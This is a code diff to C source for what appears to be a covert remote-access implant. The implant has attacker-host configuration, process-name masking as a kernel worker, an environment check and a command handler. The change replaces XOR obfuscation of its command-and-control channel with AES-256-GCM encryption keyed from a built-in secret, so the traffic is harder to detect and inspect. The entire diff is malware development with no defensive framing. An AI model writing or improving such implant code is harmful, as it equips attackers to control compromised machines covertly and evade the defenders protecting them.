@@ -12,6 +12,9 @@
 #include <sys/utsname.h>
 #include <fcntl.h>
 #include <dirent.h>
+#include <openssl/evp.h>
+#include <openssl/sha.h>
+#include <openssl/rand.h>
 
 // --- CONFIGURATION (Swapped by Framework) ---
 #ifndef LHOST
@@ -31,6 +34,13 @@ typedef struct {
     unsigned char* data;
     size_t len;
 } blob_t;
+
+// --- CRYPTOGRAPHY STATE ---
+unsigned char aes_key[32];
+
+void init_crypto() {
+    SHA256((const unsigned char*)XOR_KEY, strlen(XOR_KEY), aes_key);
+}
 
 // --- STEALTH & EVASION ---
 void mask_process(const char* name) {
@@ -94,20 +104,74 @@ unsigned char* b64_decode(const char *data, size_t input_length, size_t *out_len
     return decoded_data;
 }
 
-void xor_crypt(char *data, size_t len) {
-    const char* key = XOR_KEY;
-    size_t key_len = strlen(key);
-    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
+unsigned char* aes_encrypt(const unsigned char *plaintext, int plaintext_len, int *out_len) {
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    unsigned char iv[12];
+    RAND_bytes(iv, sizeof(iv));
+
+    unsigned char *out = malloc(12 + plaintext_len + 16); // IV + Ciphertext + Tag
+    memcpy(out, iv, 12);
+
+    int len;
+    int ciphertext_len;
+
+    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, aes_key, iv);
+    EVP_EncryptUpdate(ctx, out + 12, &len, plaintext, plaintext_len);
+    ciphertext_len = len;
+    
+    EVP_EncryptFinal_ex(ctx, out + 12 + len, &len);
+    ciphertext_len += len;
+
+    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, out + 12 + ciphertext_len);
+    *out_len = 12 + ciphertext_len + 16;
+
+    EVP_CIPHER_CTX_free(ctx);
+    return out;
+}
+
+unsigned char* aes_decrypt(const unsigned char *ciphertext_buf, int ciphertext_buf_len, int *out_len) {
+    if (ciphertext_buf_len < 12 + 16) return NULL;
+
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    unsigned char iv[12];
+    unsigned char tag[16];
+    memcpy(iv, ciphertext_buf, 12);
+    memcpy(tag, ciphertext_buf + ciphertext_buf_len - 16, 16);
+
+    int actual_ct_len = ciphertext_buf_len - 12 - 16;
+    unsigned char *out = malloc(actual_ct_len + 1);
+
+    int len;
+    int plaintext_len;
+
+    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, aes_key, iv);
+    EVP_DecryptUpdate(ctx, out, &len, ciphertext_buf + 12, actual_ct_len);
+    plaintext_len = len;
+
+    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
+    int ret = EVP_DecryptFinal_ex(ctx, out + len, &len);
+
+    EVP_CIPHER_CTX_free(ctx);
+
+    if (ret > 0) {
+        plaintext_len += len;
+        out[plaintext_len] = '\0';
+        *out_len = plaintext_len;
+        return out;
+    } else {
+        free(out);
+        return NULL;
+    }
 }
 
 void send_enc(int fd, const char* data) {
     size_t len = strlen(data);
-    char* crypted = malloc(len);
+    int enc_len = 0;
+    unsigned char* crypted = aes_encrypt((const unsigned char*)data, len, &enc_len);
     if (!crypted) return;
-    memcpy(crypted, data, len);
-    xor_crypt(crypted, len);
+    
     size_t b64_len = 0;
-    char* b64 = b64_encode((unsigned char*)crypted, len, &b64_len);
+    char* b64 = b64_encode(crypted, enc_len, &b64_len);
     free(crypted);
     if (!b64) return;
     uint32_t net_len = htonl(b64_len);
@@ -135,9 +199,13 @@ blob_t recv_enc(int fd) {
     unsigned char* dec = b64_decode(b64, b64_len, &dec_len);
     free(b64);
     if (!dec) return res;
-    xor_crypt((char*)dec, dec_len);
-    res.data = dec;
-    res.len = dec_len;
+    
+    int plain_len = 0;
+    unsigned char* plain = aes_decrypt(dec, dec_len, &plain_len);
+    free(dec);
+    
+    res.data = plain;
+    res.len = plain_len;
     return res;
 }
 
@@ -224,6 +292,7 @@ void handle_cmd(int fd, char* cmd) {
 
 int main() {
     if (!check_env()) return 1;
+    init_crypto();
     // mask_process("[kworker/u:1]");
     while(1) {
         int fd = socket(AF_INET, SOCK_STREAM, 0);
